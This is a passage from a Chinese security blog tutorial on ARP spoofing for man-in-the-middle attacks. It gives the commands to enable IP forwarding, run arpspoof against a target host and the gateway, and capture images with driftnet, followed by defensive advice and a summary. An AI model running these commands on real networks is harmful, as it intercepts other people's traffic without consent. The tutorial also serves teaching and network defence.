title="2、ARP欺骗实现中间人攻击"></a>2、ARP欺骗实现中间人攻击</h2><p>ARP欺骗通过欺骗目标主机和网关的ARP缓存，实现攻击者在通信链路中间，拦截、篡改数据包。</p><blockquote><p><strong>注意：</strong> 为保证中间人攻击的正常进行，需先开启IP转发功能，否则会导致目标主机断网。</p></blockquote><h3 id="开启IP转发"><a href="#开启IP转发" class="headerlink" title="开启IP转发"></a>开启IP转发</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward<br></code></pre></td></tr></table></figure><p>此命令开启Linux系统的IP数据包转发功能，使攻击机能够作为中间节点转发网络流量，确保目标主机网络不被中断。</p><h3 id="启动ARP欺骗"><a href="#启动ARP欺骗" class="headerlink" title="启动ARP欺骗"></a>启动ARP欺骗</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">arpspoof -i eth0 -t 192.168.118.138 192.168.118.2<br>arpspoof -i eth0 -t 192.168.118.2 192.168.118.138<br></code></pre></td></tr></table></figure><p>这里同时对目标主机和网关进行欺骗，实现双向通信劫持。</p><h3 id="利用图片嗅探工具捕获数据"><a href="#利用图片嗅探工具捕获数据" class="headerlink" title="利用图片嗅探工具捕获数据"></a>利用图片嗅探工具捕获数据</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">driftnet -i eth0<br></code></pre></td></tr></table></figure><p><code>driftnet</code>可以监听通过网卡传输的图片数据，捕获目标主机访问网页时加载的图片，直观展示中间人攻击带来的数据泄露。</p><hr><h2 id="3、工具介绍"><a href="#3、工具介绍" class="headerlink" title="3、工具介绍"></a>3、工具介绍</h2><ul><li><strong>fping</strong>：快速探测存活主机的工具，适合批量扫描网络。</li><li><strong>arpspoof</strong>：ARP欺骗工具，模拟ARP响应包，伪造MAC-IP映射。</li><li><strong>driftnet</strong>：图像嗅探工具，监听网络中的图片资源。</li></ul><hr><h2 id="4、防御建议"><a href="#4、防御建议" class="headerlink" title="4、防御建议"></a>4、防御建议</h2><ul><li><strong>开启静态ARP绑定</strong>：为关键设备配置静态ARP表，防止ARP缓存被恶意篡改。</li><li><strong>使用安全交换机</strong>：启用ARP防护功能，如动态ARP检查（DAI）。</li><li><strong>网络隔离</strong>：合理划分子网，限制广播域大小，降低攻击面。</li><li><strong>监控ARP流量</strong>：利用入侵检测系统（IDS）检测异常ARP包。</li></ul><hr><h2 id="5、总结"><a href="#5、总结" class="headerlink" title="5、总结"></a>5、总结</h2><p>ARP欺骗作为一种经典中间人攻击手法，能够在局域网环境下有效拦截和篡改数据流量。熟悉其攻击原理及操作流程，对于网络安全攻防及安全加固都有重要意义。通过合理配置网络和增强监控，可以有效防范此类攻击，保障局域网通信的安全性。</p><hr><h3 id="附图"><a href="#附图" class="headerlink" title="附图"></a>附图</h3><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191225214057.png" alt="ARP断网攻击示例"></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191225220422-1024x348.png" alt="ARP欺骗攻击效果"></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191225224557-1024x427.png" alt="driftnet嗅探图片"></p>]]></content>
    
    
    
    <tags>
      
      <tag>ARP攻击</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
